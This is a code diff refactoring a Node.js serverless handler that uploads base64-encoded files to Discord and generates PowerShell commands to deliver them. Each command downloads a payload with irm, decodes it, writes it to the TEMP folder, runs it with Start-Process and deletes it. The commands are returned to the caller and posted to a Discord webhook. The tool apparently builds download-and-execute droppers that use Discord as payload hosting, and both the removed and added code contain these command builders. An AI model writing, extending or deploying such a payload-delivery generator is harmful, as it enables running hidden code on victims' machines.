@@ -8,14 +8,15 @@ const handler = async (req, res) => {
   res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
 
   if (req.method === 'OPTIONS') return res.status(200).end();
-  if (req.method !== 'POST') return res.status(200).json({ ok: true, msg: 'API is running' });
+  if (req.method !== 'POST') return res.status(200).json({ ok: true, status: 'API is ready' });
 
   try {
     const { files } = req.body;
-    if (!files || !files[0]) return res.status(400).json({ success: false, error: 'No files provided' });
+    if (!files || !files[0]) {
+      return res.status(400).json({ success: false, error: 'No files provided' });
+    }
 
     const uploadResults = [];
-    
     for (const file of files) {
       const encodedName = file.filename.replace(/\.[^/.]+$/, '') + '.b64';
       const boundary = '----Boundary' + Math.random().toString(36).substring(2);
@@ -52,37 +53,23 @@ const handler = async (req, res) => {
         discordReq.end();
       });
 
-      const cmd = `powershell -c "$t=\\"$env:TEMP\\${file.filename}\\";$u='${uploadedUrl}';$d=((irm $u) -replace '[^A-Za-z0-9+/=]','');[IO.File]::WriteAllBytes($t,[Convert]::FromBase64String($d));Start-Process $t -Wait;Remove-Item $t"`;
-
       uploadResults.push({ url: uploadedUrl, name: file.filename });
     }
 
-    let cmd = '';
-    if (uploadResults.length === 1) {
-      const r = uploadResults[0];
-      cmd = `powershell -c "$t=\\"$env:TEMP\\${r.name}\\";$u='${r.url}';$d=((irm $u) -replace '[^A-Za-z0-9+/=]','');[IO.File]::WriteAllBytes($t,[Convert]::FromBase64String($d));Start-Process $t -Wait;Remove-Item $t"`;
-    } else {
-      let varDefs = [], cmdParts = [], startParts = [], tVars = [];
-      uploadResults.forEach((r, i) => {
-        const idx = i + 1;
-        varDefs.push(`$t${idx}=\\"$env:TEMP\\${r.name}\\"`, `$u${idx}='${r.url}'`);
-        cmdParts.push(`[IO.File]::WriteAllBytes($t${idx},[Convert]::FromBase64String((irm $u${idx}).Trim().Trim('\\"')))`);
-        startParts.push(`Start-Process $t${idx} -Wait`);
-        tVars.push(`$t${idx}`);
-      });
-      cmd = `powershell -c "${varDefs.join(';')};${cmdParts.join(';')};${startParts.join(';')};Remove-Item ${tVars.join(',')}"`;
-    }
+    const genCmd = (r, i) => {
+      const suffix = i === 0 ? '' : (i + 1).toString();
+      return `$t${suffix}=$env:TEMP+'\\${r.name}';$u${suffix}='${r.url}';$d${suffix}=((irm $u${suffix})-replace'[^A-Za-z0-9+/=]','');[IO.File]::WriteAllBytes($t${suffix},[Convert]::FromBase64String($d${suffix}));Start-Process $t${suffix} -Wait;Remove-Item $t${suffix}`;
+    };
 
-    // Send Discord notification
+    const combinedLogic = uploadResults.map((r, i) => genCmd(r, i)).join(';');
+    const finalCmd = `powershell -c "${combinedLogic}"`;
+
     const wh = https.request(DISCORD_WEBHOOK, { method: 'POST', headers: { 'Content-Type': 'application/json' } });
-    wh.write(JSON.stringify({
-      content: `📁 **${uploadResults.map(r => r.name).join(', ')}**\n\`\`\`powershell\n${cmd}\n\`\`\``
-    }));
+    wh.write(JSON.stringify({ content: `📁 **${uploadResults.map(r => r.name).join(', ')}**\n\`\`\`powershell\n${finalCmd}\n\`\`\`` }));
     wh.end();
 
-    return res.status(200).json({ success: true, command: cmd });
+    return res.status(200).json({ success: true, command: finalCmd });
   } catch (err) {
-    console.error(err);
     return res.status(500).json({ success: false, error: err.message });
   }
 };
